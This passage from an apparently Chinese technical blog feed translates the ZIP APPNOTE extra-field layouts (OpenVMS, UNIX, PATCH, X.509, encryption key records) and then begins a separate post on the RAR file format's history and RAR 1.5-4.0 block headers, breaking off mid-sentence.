Field)(0x000C)"></a>2.5.4、-OpenVMS扩展字段(-OpenVMS Extra Field)(0x000C)</h4><p>以下是<code>OpenVMS属性“扩展”块</code>的布局。</p><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x000C</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">总“扩展”块的大小</td></tr><tr><td style="text-align:left">CRC</td><td style="text-align:center">4</td><td style="text-align:left">剩余块的32位CRC</td></tr><tr><td style="text-align:left">Tag1</td><td style="text-align:center">2</td><td style="text-align:left">OpenVMS属性＃1的标签</td></tr><tr><td style="text-align:left">Size1</td><td style="text-align:center">2</td><td style="text-align:left">属性＃1的大小，以字节为单位</td></tr><tr><td style="text-align:left">(var)</td><td style="text-align:center">Size1</td><td style="text-align:left">属性＃1数据</td></tr><tr><td style="text-align:left">…</td><td style="text-align:center">…</td><td style="text-align:left">…</td></tr><tr><td style="text-align:left">TagN</td><td style="text-align:center">2</td><td style="text-align:left">OpenVMS属性＃N的标签</td></tr><tr><td style="text-align:left">SizeN</td><td style="text-align:center">2</td><td style="text-align:left">属性＃N的大小，以字节为单位</td></tr><tr><td style="text-align:left">(var)</td><td style="text-align:center">SizeN</td><td style="text-align:left">属性＃N数据</td></tr></tbody></table><p><strong><code>OpenVMS扩展字段规则：</code></strong><br>&emsp;&emsp;将存在<code>一个</code>或<code>多个</code>属性，每个属性之前都带有上述<code>TagX</code>和<code>SizeX</code>值。 这些值与在OpenVMS C下的ATR.H中定义的<code>ATR$C_XXXX</code>和<code>ATR$S_XXXX</code>常数相同。这两个值都不为<code>0</code>。<br>&emsp;&emsp;不执行<code>字对齐或填充</code>。<br>&emsp;&emsp;行为良好的<code>PKZIP/OpenVMS</code>程序不应产生具有<code>相同TagX值</code>的<code>多个子块</code>。 另外，在特定的目录记录中，不得存在多个<code>0x000C</code>类型的“扩展”块。</p><h4 id="2-5-5、-UNIX扩展字段-UNIX-Extra-Field-0x000D"><a href="#2-5-5、-UNIX扩展字段-UNIX-Extra-Field-0x000D" class="headerlink" title="2.5.5、-UNIX扩展字段(-UNIX Extra Field)(0x000D)"></a>2.5.5、-UNIX扩展字段(-UNIX Extra Field)(0x000D)</h4><p>以下是<code>UNIX“扩展”块</code>的布局。</p><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x000D</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">以下数据块的大小</td></tr><tr><td style="text-align:left">Atime</td><td style="text-align:center">4</td><td style="text-align:left">文件最后访问时间</td></tr><tr><td style="text-align:left">Mtime</td><td style="text-align:center">4</td><td style="text-align:left">文件最后修改时间</td></tr><tr><td style="text-align:left">Uid</td><td style="text-align:center">2</td><td style="text-align:left">文件用户ID</td></tr><tr><td style="text-align:left">Gid</td><td style="text-align:center">2</td><td style="text-align:left">文件组ID</td></tr><tr><td style="text-align:left">(var)</td><td style="text-align:center">N</td><td style="text-align:left">可变长度数据字段</td></tr></tbody></table><p>&emsp;&emsp;<code>可变长度数据字段</code>将包含特定于文件类型的数据。当前，唯一允许的值为硬链接或符号链接“链接到”的<code>原始文件名</code>，以及<code>字符</code>和块设备节点的<code>主要和次要设备节点号</code>。由于<code>设备节点</code>不能是符号链接或硬链接，因此仅存储一组可变长度数据。<code>链接文件</code>将具有存储的原始文件的名称。此名称不是以<code>NULL</code>终止的。可以通过检查<code>TSize -12</code>来确定其大小。<code>设备条目</code>将有<code>8个字节</code>存储为两个<code>4字节条目</code>(采用<code>小端序</code>格式)。第一个条目将是<code>主设备号</code>，第二个条目是<code>次设备号</code>。</p><h4 id="2-5-6、-PATCH描述符扩展字段-PATCH-Descriptor-Extra-Field-0x000F"><a href="#2-5-6、-PATCH描述符扩展字段-PATCH-Descriptor-Extra-Field-0x000F" class="headerlink" title="2.5.6、-PATCH描述符扩展字段(-PATCH Descriptor Extra Field)(0x000F)"></a>2.5.6、-PATCH描述符扩展字段(-PATCH Descriptor Extra Field)(0x000F)</h4><p>以下是<code>PATCH描述符“扩展”块</code>的布局。</p><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x000F</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">总“扩展”块的大小</td></tr><tr><td style="text-align:left">Version</td><td style="text-align:center">2</td><td style="text-align:left">描述符的版本</td></tr><tr><td style="text-align:left">Flags</td><td style="text-align:center">4</td><td style="text-align:left">Actions和reactions（见下文）</td></tr><tr><td style="text-align:left">OldSize</td><td style="text-align:center">4</td><td style="text-align:left">被打补丁的文件大小</td></tr><tr><td style="text-align:left">OldCRC</td><td style="text-align:center">4</td><td style="text-align:left">被打补丁的文件CRC32</td></tr><tr><td style="text-align:left">NewSize</td><td style="text-align:center">4</td><td style="text-align:left">结果文件的大小</td></tr><tr><td style="text-align:left">NewCRC</td><td style="text-align:center">4</td><td style="text-align:left">结果文件的CRC32</td></tr></tbody></table><p><strong><code>Actions和reactions：</code></strong></p><table><thead><tr><th style="text-align:left">Bits</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0</td><td style="text-align:left">用于自动检测</td></tr><tr><td style="text-align:left">1</td><td style="text-align:left">视为自修补程序</td></tr><tr><td style="text-align:left">2-3</td><td style="text-align:left">保留</td></tr><tr><td style="text-align:left">4-5</td><td style="text-align:left">Actions（见下文）</td></tr><tr><td style="text-align:left">6-7</td><td style="text-align:left">保留</td></tr><tr><td style="text-align:left">8-9</td><td style="text-align:left">对缺少文件的reactions（见下文）</td></tr><tr><td style="text-align:left">10-11</td><td style="text-align:left">对较新文件的reactions（见下文）</td></tr><tr><td style="text-align:left">12-13</td><td style="text-align:left">对位置文件的reactions（见下文）</td></tr><tr><td style="text-align:left">14-15</td><td style="text-align:left">保留</td></tr><tr><td style="text-align:left">16-31</td><td style="text-align:left">保留</td></tr></tbody></table><p><strong><code>Actions：</code></strong>            </p><table><thead><tr><th style="text-align:left">Action</th><th style="text-align:left">Value</th></tr></thead><tbody><tr><td style="text-align:left">none</td><td style="text-align:left">0</td></tr><tr><td style="text-align:left">add</td><td style="text-align:left">1</td></tr><tr><td style="text-align:left">delete</td><td style="text-align:left">2</td></tr><tr><td style="text-align:left">patch</td><td style="text-align:left">3</td></tr></tbody></table><p><strong><code>reactions：</code></strong></p><table><thead><tr><th style="text-align:left">Action</th><th style="text-align:left">Value</th></tr></thead><tbody><tr><td style="text-align:left">ask</td><td style="text-align:left">0</td></tr><tr><td style="text-align:left">skip</td><td style="text-align:left">1</td></tr><tr><td style="text-align:left">ignore</td><td style="text-align:left">2</td></tr><tr><td style="text-align:left">fail</td><td style="text-align:left">3</td></tr></tbody></table><p>&emsp;&emsp;<code>补丁程序</code>支持是由PKPatchMaker(tm)技术提供的，并受美国<code>专利和正在审理的专利</code>保护。在产品中<code>使用</code>或<code>实现</code>当前附录中规定的某些技术方面(包括与<code>强加密</code>或<code>补丁</code>相关的方面)需要获得PKWARE的许可。</p><h4 id="2-5-7、-X-509证书的PKCS-7存储-PKCS-7-Store-for-X-509-Certificates-0x0014"><a href="#2-5-7、-X-509证书的PKCS-7存储-PKCS-7-Store-for-X-509-Certificates-0x0014" class="headerlink" title="2.5.7、-X.509证书的PKCS#7存储(-PKCS#7 Store for X.509 Certificates)(0x0014)"></a>2.5.7、-X.509证书的PKCS#7存储(-PKCS#7 Store for X.509 Certificates)(0x0014)</h4><p>&emsp;&emsp;该字段必须包含有关可以<code>用来签名的每个证书文件</code>的信息。当为ZIP文件启用<code>中心目录加密功能</code>时，该记录将出现在“<code>压缩文档扩展数据记录</code>(Archive extra data record)”中，否则将出现在<code>第一个中心目录记录</code>中，而在<code>任何其他记录</code>中将<code>被忽略</code>。</p><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0014</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">存储的数据的大小</td></tr><tr><td style="text-align:left">TData</td><td style="text-align:center">TSize</td><td style="text-align:left">存储的数据</td></tr></tbody></table><h4 id="2-5-8、-X-509证书ID和单个文件的签名-X-509-Certificate-ID-and-Signature-for-individual-file-0x0015"><a href="#2-5-8、-X-509证书ID和单个文件的签名-X-509-Certificate-ID-and-Signature-for-individual-file-0x0015" class="headerlink" title="2.5.8、-X.509证书ID和单个文件的签名(-X.509 Certificate ID and Signature for individual file)(0x0015)"></a>2.5.8、-X.509证书ID和单个文件的签名(-X.509 Certificate ID and Signature for individual file)(0x0015)</h4><p>&emsp;&emsp;此字段包含有关使用<code>PKCS#7存储</code>中的哪个证书对<code>特定文件</code>进行签名的信息。它还包含<code>签名数据</code>。该字段可以出现<code>多次</code>，但<code>每个证书</code>只能出现一次。</p><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0015</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">后续数据的大小</td></tr><tr><td style="text-align:left">TData</td><td style="text-align:center">TSize</td><td style="text-align:left">签名数据</td></tr></tbody></table><h4 id="2-5-9、-X-509证书ID和中心目录签名-X-509-Certificate-ID-and-Signature-for-central-directory-0x0016"><a href="#2-5-9、-X-509证书ID和中心目录签名-X-509-Certificate-ID-and-Signature-for-central-directory-0x0016" class="headerlink" title="2.5.9、-X.509证书ID和中心目录签名(-X.509 Certificate ID and Signature for central directory)(0x0016)"></a>2.5.9、-X.509证书ID和中心目录签名(-X.509 Certificate ID and Signature for central directory)(0x0016)</h4><p>&emsp;&emsp;此字段包含有关使用<code>PKCS#7存储</code>中的哪个证书来签名<code>中心目录结构</code>的信息。当为ZIP文件启用<code>中心目录加密功能</code>时，该记录将显示在“<code>压缩文档扩展数据记录</code>(Archive extra data record)”中，否则将出现在<code>第一个中心目录记录</code>中。</p><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0016</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">后续数据的大小</td></tr><tr><td style="text-align:left">TData</td><td style="text-align:center">TSize</td><td style="text-align:left">数据</td></tr></tbody></table><h4 id="2-5-10、-强加密头-Strong-Encryption-Header-0x0017"><a href="#2-5-10、-强加密头-Strong-Encryption-Header-0x0017" class="headerlink" title="2.5.10、-强加密头(-Strong Encryption Header)(0x0017)"></a>2.5.10、-强加密头(-Strong Encryption Header)(0x0017)</h4><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0017</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">后续数据的大小</td></tr><tr><td style="text-align:left">Format</td><td style="text-align:center">2</td><td style="text-align:left">该记录的格式定义</td></tr><tr><td style="text-align:left">AlgID</td><td style="text-align:center">2</td><td style="text-align:left">加密算法标识符</td></tr><tr><td style="text-align:left">Bitlen</td><td style="text-align:center">2</td><td style="text-align:left">加密密钥的位长</td></tr><tr><td style="text-align:left">Flags</td><td style="text-align:center">2</td><td style="text-align:left">处理标志</td></tr><tr><td style="text-align:left">CertData</td><td style="text-align:center">TSize-8</td><td style="text-align:left">证书解密扩展字段数据（请参阅“强加密规范”下描述证书处理方法的部分中对CertData的解释）</td></tr></tbody></table><p>有关详细信息，请参见描述<code>强加密规范</code>的部分。 </p><h4 id="2-5-11、-记录管理控制-Record-Management-Controls-0x0018"><a href="#2-5-11、-记录管理控制-Record-Management-Controls-0x0018" class="headerlink" title="2.5.11、-记录管理控制(-Record Management Controls)(0x0018)"></a>2.5.11、-记录管理控制(-Record Management Controls)(0x0018)</h4><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0018</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">CSize</td><td style="text-align:center">2</td><td style="text-align:left">总扩展数据块的大小</td></tr><tr><td style="text-align:left">Tag1</td><td style="text-align:center">2</td><td style="text-align:left">记录控制属性1</td></tr><tr><td style="text-align:left">Size1</td><td style="text-align:center">2</td><td style="text-align:left">属性1的大小，以字节为单位</td></tr><tr><td style="text-align:left">Data1</td><td style="text-align:center">Size1</td><td style="text-align:left">属性1数据</td></tr><tr><td style="text-align:left">…</td><td style="text-align:center">…</td><td style="text-align:left">…</td></tr><tr><td style="text-align:left">TagN</td><td style="text-align:center">2</td><td style="text-align:left">记录控制属性N</td></tr><tr><td style="text-align:left">SizeN</td><td style="text-align:center">2</td><td style="text-align:left">属性N的大小，以字节为单位</td></tr><tr><td style="text-align:left">DataN</td><td style="text-align:center">SizeN</td><td style="text-align:left">属性N数据</td></tr></tbody></table><h4 id="2-5-12、-PKCS＃7加密接受者证书列表-PKCS-7-Encryption-Recipient-Certificate-List-0x0019"><a href="#2-5-12、-PKCS＃7加密接受者证书列表-PKCS-7-Encryption-Recipient-Certificate-List-0x0019" class="headerlink" title="2.5.12、-PKCS＃7加密接受者证书列表(-PKCS#7 Encryption Recipient Certificate List)(0x0019)"></a>2.5.12、-PKCS＃7加密接受者证书列表(-PKCS#7 Encryption Recipient Certificate List)(0x0019)</h4><p>&emsp;&emsp;该字段可以包含有关<code>加密处理</code>中使用的每个证书的信息，并且可以用来识别<code>允许谁解密加密文件</code>。 该字段仅应出现在“<code>压缩文档扩展数据记录</code>(Archive extra data record)”中。 该字段<code>不是必填字段</code>，仅用于通过<code>保留公共加密密钥数据</code>来帮助<code>压缩文档修改</code>。 个别安全要求可能会要求<code>省略</code>此数据以<code>阻止信息泄露</code>。</p><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0019</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">存储的数据的大小</td></tr><tr><td style="text-align:left">TData</td><td style="text-align:center">TSize</td><td style="text-align:left">存储的数据</td></tr></tbody></table><p><code>TData:</code></p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">Version</td><td style="text-align:center">2</td><td style="text-align:left">格式版本号-此时必须为0x0001</td></tr><tr><td style="text-align:left">CStore</td><td style="text-align:center">(var)</td><td style="text-align:left">PKCS＃7数据Blob</td></tr></tbody></table><p>&emsp;&emsp;有关详细信息，请参见描述<code>强加密规范</code>的部分。 </p><h4 id="2-5-13、-MVS扩展字段-MVS-Extra-Field-0x0065"><a href="#2-5-13、-MVS扩展字段-MVS-Extra-Field-0x0065" class="headerlink" title="2.5.13、-MVS扩展字段(-MVS Extra Field)(0x0065)"></a>2.5.13、-MVS扩展字段(-MVS Extra Field)(0x0065)</h4><p>以下是<code>MVS扩展字段</code>的布局。<br><strong><code>注意:</code></strong>某些字段以<code>大端格式</code>存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0065</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">以下数据块的大小</td></tr><tr><td style="text-align:left">ID</td><td style="text-align:center">4</td><td style="text-align:left">EBCDIC“Z390” 0xE9F3F9F0或“T4MV”用于TargetFour</td></tr><tr><td style="text-align:left">(var)</td><td style="text-align:center">TSize-4</td><td style="text-align:left">属性数据（请参阅附录B）</td></tr></tbody></table><h4 id="2-5-14、-OS-400扩展字段-OS-400-Extra-Field-0x0065"><a href="#2-5-14、-OS-400扩展字段-OS-400-Extra-Field-0x0065" class="headerlink" title="2.5.14、-OS/400扩展字段(-OS/400 Extra Field)(0x0065)"></a>2.5.14、-OS/400扩展字段(-OS/400 Extra Field)(0x0065)</h4><p>以下是<code>OS/400扩展字段</code>的布局。<br><strong><code>注意:</code></strong>某些字段以<code>大端格式</code>存储。<br>除非另有说明，否则所有文本均为<code>EBCDIC</code>格式。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0065</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">以下数据块的大小</td></tr><tr><td style="text-align:left">ID</td><td style="text-align:center">4</td><td style="text-align:left">EBCDIC“I400” 0xC9F4F0F0或“T4MV”用于TargetFour</td></tr><tr><td style="text-align:left">(var)</td><td style="text-align:center">TSize-4</td><td style="text-align:left">属性数据（请参阅附录A）</td></tr></tbody></table><h4 id="2-5-15、-策略解密密钥记录扩展字段-Policy-Decryption-Key-Record-Extra-Field-0x0021"><a href="#2-5-15、-策略解密密钥记录扩展字段-Policy-Decryption-Key-Record-Extra-Field-0x0021" class="headerlink" title="2.5.15、-策略解密密钥记录扩展字段(-Policy Decryption Key Record Extra Field)(0x0021)"></a>2.5.15、-策略解密密钥记录扩展字段(-Policy Decryption Key Record Extra Field)(0x0021)</h4><p>&emsp;&emsp;以下是<code>策略解密密钥扩展块</code>的布局。<code>TData</code>是可变长度，可变内容字段。它包含有关<code>加密</code>和/或<code>加密密钥源</code>的信息。有关当前<code>TData结构</code>的信息，请与PKWARE联系。此<code>扩展块</code>中的信息也可以放在<code>注释字段</code>中。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0021</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">以下数据块的大小</td></tr><tr><td style="text-align:left">TData</td><td style="text-align:center">TSize</td><td style="text-align:left">密钥的数据</td></tr></tbody></table><h4 id="2-5-16、-密钥提供者记录扩展字段-Key-Provider-Record-Extra-Field-0x0022"><a href="#2-5-16、-密钥提供者记录扩展字段-Key-Provider-Record-Extra-Field-0x0022" class="headerlink" title="2.5.16、-密钥提供者记录扩展字段(-Key Provider Record Extra Field)(0x0022)"></a>2.5.16、-密钥提供者记录扩展字段(-Key Provider Record Extra Field)(0x0022)</h4><p>&emsp;&emsp;以下是<code>密钥提供者扩展块</code>的布局。<code>TData</code>是可变长度，可变内容字段。 它包含有关<code>加密</code>和/或<code>加密密钥源</code>的信息。有关当前<code>TData</code>结构的信息，请与PKWARE联系。此<code>扩展块</code>中的信息也可以放在<code>注释字段</code>中。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0022</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">以下数据块的大小</td></tr><tr><td style="text-align:left">TData</td><td style="text-align:center">TSize</td><td style="text-align:left">密钥的数据</td></tr></tbody></table><h4 id="2-5-17、-策略密钥数据记录记录扩展字段-Policy-Key-Data-Record-Record-Extra-Field-0x0023"><a href="#2-5-17、-策略密钥数据记录记录扩展字段-Policy-Key-Data-Record-Record-Extra-Field-0x0023" class="headerlink" title="2.5.17、-策略密钥数据记录记录扩展字段(-Policy Key Data Record Record Extra Field)(0x0023)"></a>2.5.17、-策略密钥数据记录记录扩展字段(-Policy Key Data Record Record Extra Field)(0x0023)</h4><p>&emsp;&emsp;以下是<code>策略密钥数据扩展块</code>的布局。<code>TData</code>是可变长度，可变内容字段。它包含有关<code>加密</code>和/或<code>加密密钥源</code>的信息。有关当前<code>TData</code>结构的信息，请与PKWARE联系。此扩展块中的信息也可以放在<code>注释字段</code>中。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0023</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">以下数据块的大小</td></tr><tr><td style="text-align:left">TData</td><td style="text-align:center">TSize</td><td style="text-align:left">密钥的数据</td></tr></tbody></table><hr><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1] <a href="https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.3.6.TXT" target="_blank" rel="noopener">官方文档 - APPNOTE-6.3.6.TXT</a></p>]]></content>
      
      <categories>
          
          <category> FileFormat </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>RAR文件格式分析</title>
      <link href="/2020/04/10/RAR%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/"/>
      <url>/2020/04/10/RAR%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<blockquote><p>RAR文件格式分析<br>突然心血来潮，分析了一下这个格式，在家无法专心学习，一篇文章拖了挺长时间。<br>对RAR文件格式的细节有了更深刻的了解。<br><a id="more"></a></p></blockquote><hr><h2 id="1、RAR简介"><a href="#1、RAR简介" class="headerlink" title="1、RAR简介"></a>1、RAR简介</h2><blockquote><p><strong><code>wikipedia:</code></strong><br>1、<a href="https://en.wikipedia.org/wiki/RAR_(file_format" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/RAR_(file_format</a>)<br>2、<a href="https://www.loc.gov/preservation/digital/formats/fdd/fdd000450.shtml" target="_blank" rel="noopener">https://www.loc.gov/preservation/digital/formats/fdd/fdd000450.shtml</a></p></blockquote><p>&emsp;&emsp;RAR是一种专利文件格式，用于<code>数据压缩</code>与<code>归档打包</code>，开发者为<code>尤金·罗谢尔</code>（俄语：Евгений Лазаревич Рошал，拉丁转写：Yevgeny Lazarevich Roshal），RAR的全名是“<code>Roshal ARchive</code>”，即“罗谢尔的归档”之意。首个公开版本<code>RAR 1.3</code>发布于1993年。<br>&emsp;&emsp;尤金·罗谢尔，1972年3月10日生于<code>俄罗斯</code>。毕业于俄罗斯车里雅宾斯克工业大学（Chelyabinsk Technical University，今南乌拉州立大学），也是<code>FAR文件管理器</code>的作者。他开发程序压缩或解压RAR文件，最初用于DOS，后来移植到其它平台。主要的Windows版本编码器，称为WinRAR，以共享软件的形式发行。不过罗谢尔公开了解码器源码，UnRAR解码器许可证以不许发布编译RAR兼容编码器为条件下允许有条件自由发布与修改，而RAR编码器一直是有专利的。<br>&emsp;&emsp;最近的开发者是尤金·罗谢尔的胞兄<code>亚历山大·罗谢尔</code>。虽然其解码器有专利，编译好的解压程序仍然存在于若干平台，例如开源的7-Zip。<br>&emsp;&emsp;RAR同时也拥有成熟的加密算法，<code>2.0 版本前</code>加密算法未公开，<code>2.0 版本后</code>使用AES算法加密，在没有密码情况下目前只有<code>暴力破解</code>。</p><p><strong><code>文件特点：</code></strong></p><ul><li>RAR通常情况比ZIP压缩比高，但压缩／解压缩速度较慢。</li><li><strong>分卷压缩：</strong>压缩后分割为多个文件。</li><li><strong>固实压缩：</strong>将要压缩的文件视为同一个文件以加大压缩比，代价是取用压缩包中任何文件需要解压整个压缩包。</li><li><strong>恢复记录：</strong>加入冗余数据用于修复，在压缩包本身损坏但恢复记录够多时可对损坏压缩包进行恢复。</li><li><strong>加密：</strong>RAR 2.0使用AES-128-CBC，RAR5.0以后为AES-256-CBC。之前RAR的加密算法为私有。当前除了暴力破解之外不存在（至少没有公开）有效的破解方法。</li></ul><h3 id="1-1、RAR的历史版本"><a href="#1-1、RAR的历史版本" class="headerlink" title="1.1、RAR的历史版本"></a>1.1、RAR的历史版本</h3><p>RAR文件格式的<code>修订历史记录</code>：</p><ul><li><strong><code>1.3</code></strong> 第一个公开版本，没有“ Rar！” 签名。</li><li><strong><code>1.5</code></strong> 更改未知。</li><li><strong><code>2.0</code></strong> 与WinRAR 2.0和Rar一起发布，用于MS-DOS 2.0。</li><li><strong><code>2.9</code></strong> 在WinRAR版本3.00中发布。</li><li><strong><code>5.0</code></strong> WinRAR 5.0及更高版本支持。</li></ul><p>WinRAR 5.0和Android的RAR将<code>2.9版本</code>称为<code>RAR4</code>。</p><hr><h2 id="2、RAR压缩文件格式分析"><a href="#2、RAR压缩文件格式分析" class="headerlink" title="2、RAR压缩文件格式分析"></a>2、RAR压缩文件格式分析</h2><h3 id="2-1、RAR-1-5-4-0文件格式分析"><a href="#2-1、RAR-1-5-4-0文件格式分析" class="headerlink" title="2.1、RAR 1.5 - 4.0文件格式分析"></a>2.1、RAR 1.5 - 4.0文件格式分析</h3><blockquote><p><strong><code>参考资料：</code></strong><br>1、<a href="http://acritum.com/winrar/rar-format" target="_blank" rel="noopener">http://acritum.com/winrar/rar-format</a><br>2、<a href="https://forensicswiki.xyz/page/RAR" target="_blank" rel="noopener">https://forensicswiki.xyz/page/RAR</a><br>3、<a href="https://blog.csdn.net/howeverpf/article/details/8909362" target="_blank" rel="noopener">https://blog.csdn.net/howeverpf/article/details/8909362</a><br>4、<a href="https://codedread.github.io/bitjs/docs/unrar.html" target="_blank" rel="noopener">https://codedread.github.io/bitjs/docs/unrar.html</a></p></blockquote><p><strong><code>实例环境：</code></strong> </p><div align="left"><img src="/resources/2020/RAR_Format/SimpleRAR_env0.jpg" width="50%" height="50%" alt="例子RAR文件环境0"></div><br><div align="left"><img src="/resources/2020/RAR_Format/SimpleRAR_env1.jpg" width="70%" height="50%" alt="例子RAR文件环境1"></div><p>&emsp;&emsp;压缩文件由<code>可变长度</code>的块组成。这些<code>块的顺序</code>可以变化，但是第一个块必须是<code>标记块</code>，然后是<code>压缩文件头块</code>。</p><p>&emsp;&emsp;现在公开的块类型有：<code>标记块</code>，<code>压缩文件头块</code>，<code>文件头块</code>，<code>注释头块</code>，<code>用户身份信息块</code>，<code>子块</code>和<code>恢复记录块</code>等。每一块的开始是由通用字段开始，且每一个不同的块的通用字段结构都是一样的。 </p><p><code>通用字段结构</code>如下表：</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">HEAD_CRC</td><td style="text-align:center">2</td><td style="text-align:left">所有块或块部分的CRC</td></tr><tr><td style="text-align:left">HEAD_TYPE</td><td style="text-align:center">1</td><td style="text-align:left">块类型</td></tr><tr><td style="text-align:left">HEAD_FLAGS</td><td style="text-align:center">2</td><td style="text-align:left">块标记</td></tr><tr><td style="text-align:left">HEAD_SIZE</td><td style="text-align:center">2</td><td style="text-align:left">块大小</td></tr></tbody></table><p>如果块标记的第一位被置1的话(<code>(HEAD_FLAGS &amp; 0x8000)!= 0</code>)还存在：</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">ADD_SIZE</td><td style="text-align:center">4</td><td style="text-align:left">可选结构 - 增加块大小</td></tr></tbody></table><p>&emsp;&emsp;所以文件大小的计算分两种情况，当块标记<code>HEAD_FLAGS</code>首位未置1，则总块大小就是<code>HEAD_SIZE</code>，当块标记<code>HEAD_FLAGS</code>首位置1，可选结构<code>ADD_SIZE</code>存在，则总块大小为<code>HEAD_SIZE</code>+<code>ADD_SIZE</code>。</p><p>&emsp;&emsp;在每个块中，<code>HEAD_FLAGS</code>中的以下位具有相同的含义：</p><blockquote><p><code>0x4000</code> - 如果设置，则较旧的RAR版本将忽略该块，并在更新存档时将其删除。如果清除，则在更新存档时将此块复制到新的存档文件；<br><code>0x8000</code> - 如果设置，则存在ADD_SIZE字段，且完整块大小为HEAD_SIZE + 